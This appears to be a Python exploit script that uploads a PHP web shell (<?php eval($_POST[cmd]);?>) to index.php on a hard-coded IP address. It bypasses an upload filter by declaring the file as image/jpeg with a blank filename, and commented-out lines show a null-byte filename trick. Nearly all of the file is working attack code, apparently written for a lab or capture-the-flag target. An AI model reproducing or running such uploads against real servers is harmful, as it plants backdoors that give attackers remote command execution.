# -*- coding: utf-8 -*-

import requests

# files = {'file': ('test.php\x00.jpg', open('H:\mytest.php', 'r'))}
# files = {'file': open(r'H:\test.jpg', 'rb')}

headers = {
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
    'Cache-Control':'no-cache',
    'Connection':'keep-alive',
    'Content-Length':'2975',
    'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundary',
    'Host':'202.112.51.242',
    'Origin':'http://202.112.51.242',
    'Pragma':'no-cache',
    'Referer':'http://202.112.51.242/index.php',
    'Upgrade-Insecure-Requests':'1',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    }

payload = '''------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename=" "
Content-Type: image/jpeg

<?php eval($_POST[cmd]);?>
------WebKitFormBoundary
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundary
Content-Disposition: form-data; name="error"

1
------WebKitFormBoundary--'''.encode('utf-8')

url = 'http://202.112.51.242/index.php'

r = requests.post(url, data=payload, headers=headers)
print(r.request.body)
print(r.text)
